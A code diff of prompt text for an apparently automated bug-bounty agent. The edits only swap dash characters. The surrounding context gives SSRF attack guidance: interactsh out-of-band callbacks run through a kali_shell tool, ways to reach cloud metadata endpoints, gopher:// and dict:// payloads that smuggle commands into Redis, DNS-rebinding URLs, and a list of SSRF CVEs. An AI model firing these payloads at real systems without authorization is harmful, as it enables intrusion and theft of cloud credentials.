@@ -87,7 +87,7 @@ kali_shell({{"command": "interactsh-client -server {ssrf_oob_provider} -json -v 
 kali_shell({{"command": "sleep 5 && head -20 /tmp/interactsh.log"}})
 ```
 
-**Save the PID** for later cleanup. Read the registered `.{ssrf_oob_provider}` domain from the log — random strings will NOT work, the domain is cryptographically registered with the server.
+**Save the PID** for later cleanup. Read the registered `.{ssrf_oob_provider}` domain from the log - random strings will NOT work, the domain is cryptographically registered with the server.
 
 Send a baseline external callback to confirm the sink fetches at all:
 
@@ -146,7 +146,7 @@ If the sink reflects or forwards request headers, the high-value cloud metadata 
 Direct SSRF cannot issue PUT, but:
 - If the sink reflects request headers into the outbound request, inject `X-aws-ec2-metadata-token-ttl-seconds: 21600` and rely on intermediaries (nginx, envoy sidecars) that propagate them.
 - CRLF-injection sinks: split into PUT + GET via embedded `\\r\\n` in the URL.
-- Library quirks: some HTTP clients honor URL-encoded methods inside a malformed URL — test variants per parser.
+- Library quirks: some HTTP clients honor URL-encoded methods inside a malformed URL - test variants per parser.
 - IPv6 fallback: `http://[fd00:ec2::254]/latest/meta-data/` may bypass v1-disabled config when v2 is enforced.
 
 **GCP / Azure header injection:**
@@ -179,9 +179,9 @@ If 4+ of these fire on one sink, it is hardened. Pivot to a different sink rathe
 
 For each finding, score with this scale:
 
-- **High** — Live OAST callback received, OR cloud metadata content retrieved, OR internal service banner returned in response body
-- **Medium** — Response-time differential consistent across runs, OR status-code differential between internal/external targets, OR partial OOB (DNS hit but no HTTP)
-- **Low** — Single-run timing hint, error message disclosure only, or inconsistent indicators
+- **High** - Live OAST callback received, OR cloud metadata content retrieved, OR internal service banner returned in response body
+- **Medium** - Response-time differential consistent across runs, OR status-code differential between internal/external targets, OR partial OOB (DNS hit but no HTTP)
+- **Low** - Single-run timing hint, error message disclosure only, or inconsistent indicators
 
 Rule: when uncertain, round down. False positives waste exploitation budget.
 
@@ -320,7 +320,7 @@ Internal hosts that the sink reaches but cannot resolve will produce DNS-only ca
 http://INTERNAL_NAME.REGISTERED_DOMAIN/
 ```
 
-The DNS query for `INTERNAL_NAME.REGISTERED_DOMAIN` arrives at the OAST server with the source IP of the target's DNS resolver — this is enough to confirm the sink is alive even if HTTP egress is blocked.
+The DNS query for `INTERNAL_NAME.REGISTERED_DOMAIN` arrives at the OAST server with the source IP of the target's DNS resolver - this is enough to confirm the sink is alive even if HTTP egress is blocked.
 
 ### Step 2: Timing-based port classification (when OAST blocked)
 
@@ -385,7 +385,7 @@ dict://127.0.0.1:6379/info                   (redis)
 dict://127.0.0.1:25/HELO                     (smtp)
 ```
 
-### gopher:// (raw protocol smuggling — most powerful)
+### gopher:// (raw protocol smuggling - most powerful)
 
 **Redis command injection:**
 ```
@@ -480,25 +480,25 @@ SSRF_DNS_REBINDING = """
 
 ### Free DNS rebinding services (no setup required)
 
-**1u.ms** — explicit two-IP rebind:
+**1u.ms** - explicit two-IP rebind:
 ```
 http://make-1.2.3.4-rebind-169.254.169.254.1u.ms/
 ```
 First resolution returns 1.2.3.4 (passes allowlist), second returns 169.254.169.254.
 
-**rbndr.us** — alternates between two IPs:
+**rbndr.us** - alternates between two IPs:
 ```
 http://7f000001.c0a80001.rbndr.us/        (alternates 127.0.0.1 / 192.168.0.1)
 ```
 
-**nip.io / sslip.io** — encode IP in hostname:
+**nip.io / sslip.io** - encode IP in hostname:
 ```
 http://169.254.169.254.nip.io/             (always resolves to 169.254.169.254)
 http://169-254-169-254.nip.io/             (dash form)
 http://169.254.169.254.sslip.io/           (TLS-friendly equivalent)
 ```
 
-These do NOT actually rebind — they encode the IP in the name. Useful when the allowlist is hostname-based.
+These do NOT actually rebind - they encode the IP in the name. Useful when the allowlist is hostname-based.
 
 ### Building your own (when external services are blocked)
 
@@ -592,5 +592,5 @@ When the allowlist permits a trusted domain that has its own open redirect, chai
 | CVE-2024-40898 ($4.2k) | Apache mod_rewrite Windows | UNC path |
 | CVE-2024-38472 ($4.9k) | Apache UNC SSRF | Protocol smuggling |
 
-When a similar pattern appears in your target, cite the precedent in the finding evidence — it sharpens the report.
+When a similar pattern appears in your target, cite the precedent in the finding evidence - it sharpens the report.
 """
